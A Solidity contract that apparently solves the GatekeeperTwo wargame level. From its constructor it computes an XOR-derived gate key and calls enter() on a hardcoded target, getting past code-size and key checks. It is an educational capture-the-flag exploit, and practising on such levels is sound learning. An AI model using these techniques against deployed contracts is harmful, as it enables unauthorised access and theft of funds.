// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './GatekeeperTwo.sol';

contract GatekeeperTwoHack {

  bytes8 public gateKey;
  GatekeeperTwo target;

  constructor() public{
    target = GatekeeperTwo(0x3f83748D15CcF016711aAF6ca68705CaBF8C2448);
    gateKey = bytes8(keccak256(abi.encodePacked(address(this))));
    gateKey ^= bytes8(type(uint64).max);
    target.enter(gateKey);
    
  }
  
}
